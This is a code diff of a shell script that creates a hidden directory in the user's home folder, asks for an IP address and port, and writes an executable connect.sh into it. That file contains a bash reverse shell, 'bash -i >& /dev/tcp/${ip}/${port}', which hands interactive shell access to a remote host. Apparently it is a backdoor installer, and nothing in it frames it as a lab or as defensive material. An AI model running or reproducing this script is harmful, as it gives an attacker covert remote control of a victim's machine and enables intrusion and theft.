@@ -3,8 +3,15 @@
 #Create the hidden directory ~/.textedit
 mkdir $HOME/.hidden
 
-#Copy the script to hidden folder
-cp connect.sh $HOME/.hidden/connect.sh
+#Prompt for input
+read -p "Enter IP address: " ip
+read -p "Enter port: " port
+
+#Generate and write the script to hidden folder
+echo "#!/bin/bash
+bash -i >& /dev/tcp/${ip}/${port} 0>&1 2>&1
+wait" >> $HOME/.hidden/connect.sh
+echo "Generated connect.sh in home/.hidden/connect.sh"
 
 #Give the script permission to execute
 chmod +x $HOME/.hidden/connect.sh
